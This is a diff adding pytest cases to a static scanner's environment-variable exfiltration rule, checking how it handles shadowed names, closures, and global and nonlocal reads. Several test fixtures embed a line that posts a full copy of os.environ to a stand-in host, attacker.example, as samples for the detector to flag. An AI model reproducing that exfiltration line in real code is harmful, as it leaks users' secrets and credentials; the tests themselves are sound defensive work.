@@ -726,6 +726,95 @@ class TestRunStaticPatternsDataExfiltration:
         findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
         assert not [f for f in findings if f.rule_id == "E2"]
 
+    @pytest.mark.parametrize(
+        "shadow",
+        [
+            "def helper(env):\n    return env\n",
+            "def helper():\n    env = {}\n    return env\n",
+            "helper = lambda env: env\n",
+            'names = [env for env in ("a", "b")]\n',
+            "class Config:\n    env = {}\n    def show(self):\n        return self.env\n",
+        ],
+        ids=["parameter", "local-assignment", "lambda", "comprehension", "class-attribute"],
+    )
+    def test_e2_nested_scope_shadowing_keeps_outer_passthrough(self, shadow: str):
+        """A nested scope's own ``env`` does not close the outer binding."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport subprocess\n"
+                    "env = os.environ.copy()\n"
+                    f"{shadow}"
+                    'subprocess.run(["git", "status"], env=env)'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        assert not [f for f in findings if f.rule_id == "E2"]
+
+    def test_e2_nested_scope_shadowing_does_not_hide_outer_leak(self):
+        """A shadowed name inside a nested scope still leaves the outer copy's uses tracked."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport requests\nimport subprocess\n"
+                    "env = os.environ.copy()\n"
+                    "def helper(env):\n    return env\n"
+                    'requests.post("https://attacker.example/collect", json=env)\n'
+                    'subprocess.run(["git", "status"], env=env)'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        e2 = [f for f in findings if f.rule_id == "E2"]
+        assert [f.start_line for f in e2] == [4]
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            # Closure defined after the copy.
+            "env = os.environ.copy()\n"
+            "def leak():\n"
+            '    requests.post("https://attacker.example/collect", json=env)\n'
+            'subprocess.run(["git", "status"], env=env)\n'
+            "leak()",
+            # Closure defined before the copy, called after it.
+            "def leak():\n"
+            '    requests.post("https://attacker.example/collect", json=env)\n'
+            "env = os.environ.copy()\n"
+            'subprocess.run(["git", "status"], env=env)\n'
+            "leak()",
+            # ``global`` read from a function body.
+            "def leak():\n"
+            "    global env\n"
+            '    requests.post("https://attacker.example/collect", json=env)\n'
+            "env = os.environ.copy()\n"
+            'subprocess.run(["git", "status"], env=env)\n'
+            "leak()",
+            # ``nonlocal`` read from an inner function.
+            "def outer():\n"
+            "    env = os.environ.copy()\n"
+            "    def leak():\n"
+            "        nonlocal env\n"
+            '        requests.post("https://attacker.example/collect", json=env)\n'
+            '    subprocess.run(["git", "status"], env=env)\n'
+            "    leak()",
+        ],
+        ids=["closure-after", "closure-before", "global", "nonlocal"],
+    )
+    def test_e2_environ_copy_read_by_nested_scope_still_flagged(self, source: str):
+        """A nested scope reading the outer copy counts against it, whenever it is defined."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": "import os\nimport requests\nimport subprocess\n" + source,
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        assert [f for f in findings if f.rule_id == "E2"]
+
     def test_e5_boto3_put_object_produces_finding(self):
         """boto3 put_object yields E5, MEDIUM severity."""
         state = {
